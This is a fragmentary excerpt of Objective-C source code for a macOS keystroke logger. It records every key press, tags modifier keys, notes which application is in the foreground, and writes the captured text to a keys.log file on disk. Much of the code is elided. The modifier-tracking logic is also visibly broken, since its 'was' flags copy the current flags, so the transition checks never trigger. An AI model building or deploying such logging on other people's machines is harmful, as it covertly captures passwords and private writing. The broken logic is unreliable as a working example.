...
@synthesize keyLog, lastApp;

- (void)keyPress:(NSEvent*)event {
    
    //Get modifier keys
    NSUInteger flags = event.modifierFlags;
    [self logModifierKeys:flags];
    
    //Get keyCode and convert to character
    NSString *character = [self keyCodeConversion:event.keyCode];
    [keyLog appendString:character];
}

- (void)logModifierKeys:(NSUInteger)newFlags {
    
    bool isCapsLock = newFlags & NSAlphaShiftKeyMask;
    bool isShift = newFlags & NSShiftKeyMask;
    bool isControl = newFlags & NSControlKeyMask;
    bool isOption = newFlags & NSAlternateKeyMask;
    bool isCommand = newFlags & NSCommandKeyMask;
    
    bool wasCapsLock = newFlags & NSAlphaShiftKeyMask;
    bool wasShift = newFlags & NSShiftKeyMask;
    bool wasControl = newFlags & NSControlKeyMask;
    bool wasOption = newFlags & NSAlternateKeyMask;
    bool wasCommand = newFlags & NSCommandKeyMask;
    
    if (isCapsLock && !wasCapsLock) {
        [keyLog appendString:@"<Caps Lock>"];
    }
    if (!isCapsLock && wasCapsLock) {
        [keyLog appendString:@"</Caps Lock>"];
    }
    if (isShift && !wasShift) {
        [keyLog appendString:@"<Shift>"];
    }
    if (!isShift && wasShift) {
        [keyLog appendString:@"</Shift>"];
    }
    if (isControl && !wasControl) {
        [keyLog appendString:@"<Control>"];
    }
    if (!isControl && wasControl) {
        [keyLog appendString:@"</Control>"];
    }
    if (isOption && !wasOption) {
        [keyLog appendString:@"<Option>"];
    }
    if (!isOption && wasOption) {
        [keyLog appendString:@"</Option>"];
    }
    if (isCommand && !wasCommand) {
        [keyLog appendString:@"<Command>"];
    }
    if (!isCommand && wasCommand) {
        [keyLog appendString:@"</Command>"];
    }
...
-(id)init {
    keyLog = NSMutableString.alloc.init;
...
- (void)appDidActivate:(NSNotification *)notification {
    ...
    if (![appName isEqualToString:lastApp]) {
        ...
        [keyLog appendString:closeAppToken];
...
- (void)writeLine {
    if (![keyLog isEqualToString:@""]) {
        ...
        aFile = @"/Users/admin/Desktop/IWU_agent/keys.log"; //setting the file to write to
        ...
        [aFileHandle writeData:[keyLog dataUsingEncoding:NSUTF8StringEncoding]]; //actually write the data
